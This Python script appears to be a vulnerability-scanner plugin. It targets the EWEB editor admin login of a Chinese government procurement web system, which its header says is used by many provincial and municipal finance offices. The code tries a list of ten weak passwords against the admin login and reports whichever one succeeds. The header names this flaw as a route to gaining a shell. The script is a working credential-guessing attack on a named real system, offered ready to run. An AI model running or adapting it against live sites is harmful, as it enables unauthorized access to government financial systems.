#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 政府采购系统eweb编辑器默认口令Getshell漏洞
referer: http://www.wooyun.org/bugs/wooyun-2016-0179879
author: Lucifer
description: 珠海政采软件技术有限公司的政府采购网系统 存在EWEB编辑器默认口令，直接getshell，多省市政府财政单位在用。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class gpcsoft_ewebeditor_weak_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            }
        turl = "/ewebeditor/admin/login.jsp?action=login"
        post_data = {
                "usr":"admin",
                "pwd":"81dc9bdb52d04dc20036dbd8313ed055"
            }
        vulnurl = self.url + turl
        try:
            sess = requests.Session()
            req1 = sess.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            noexist = True
            for payload in ["admin", "123456", "password", "abc123", "1qaz2wsx", "123123", "12345", "aaaaaa", "12345678", "000000"]:
                post_data2 = {
                    "usr":"admin",
                    "pwd":payload
                }
                try:
                    req2 = sess.post(vulnurl, headers=headers, data=post_data2, timeout=10, verify=False)
                    if len(req1.text) != len(req2.text):
                        if req2.status_code == 200 and r"ewebeditor" in req2.text.lower():
                            cprint("[+]存在政采eweb编辑器弱口令漏洞...(高危)\tpayload: "+vulnurl+"\tpost: "+json.dumps(post_data2), "red")
                            return True, vulnurl, "政府采购系统eweb编辑器默认口令Getshell漏洞", payload, req2.text
                except:
                    pass
            if noexist:
                cprint("[-]不存在gpcsoft_ewebeditor_weak漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = gpcsoft_ewebeditor_weak_BaseVerify(sys.argv[1])
    testVuln.run()
